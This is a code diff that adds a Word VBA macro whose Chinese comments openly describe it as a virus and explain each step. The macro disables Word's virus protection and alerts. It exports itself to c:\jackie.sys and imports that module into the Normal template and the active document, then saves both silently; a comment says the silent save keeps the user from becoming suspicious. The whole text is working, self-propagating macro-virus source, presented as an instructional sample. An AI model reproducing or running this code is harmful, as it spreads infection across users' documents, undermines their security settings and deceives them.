@@ -1,0 +1,36 @@
+Sub test()
+    'On Error Resume Next
+    Application.DisplayAlerts = wdAlertsNone
+    Application.EnableCancelKey = wdCancelDisabled
+    Application.DisplayStatusBar = False
+    Options.VirusProtection = False
+    Options.SaveNormalPrompt = False        '以上是病毒基本的自我保护措施
+    Set Doc = ActiveDocument.VBProject.VBComponents
+    '取当前活动文档中工程组件集合
+    Set Tmp = NormalTemplate.VBProject.VBComponents
+    '取Word默认模板中工程组件集合
+    Const ExportSource = "c:\jackie.sys"
+    Const VirusName = "AIGTMV1"               '该字符串相当于一个病毒感染标志
+    Application.VBE.ActiveVBProject.VBComponents(VirusName).Export ExportSource
+                                 '将当前病毒代码导出到c:\jackie.sys文件保存
+                                 
+    For i = 1 To Tmp.Count
+        If Tmp(i).Name = VirusName Then TmpInstalled = 1
+     '检查模板是否已经被感染病毒
+    Next i
+    
+    For j = 1 To Doc.Count
+        If Doc(j).Name = VirusName Then DocInstalled = 1
+                                     '检查当前活动文档是否已被感染病毒
+    Next j
+    If TmpInstalled = 0 Then                 '如果模板没有被感染，对其进行感染
+        Tmp.Import ExportSource              '从c:\jackie.sys将病毒导入模板
+        NormalTemplate.Save                  '自动保存模板，以免引起用户怀疑
+ 
+    End If
+    If DocInstalled = 0 Then                 '如果当前活动文档没有被感染
+        Doc.Import ExportSource              '从c:\jackie.sys将病毒导入当前活动文档
+        ActiveDocument.SaveAs ActiveDocument.FullName '自动保存当前活动文档
+    End If
+    MsgBox "Word instructional macro by jackie", 0, "Word.APMP"
+End Sub
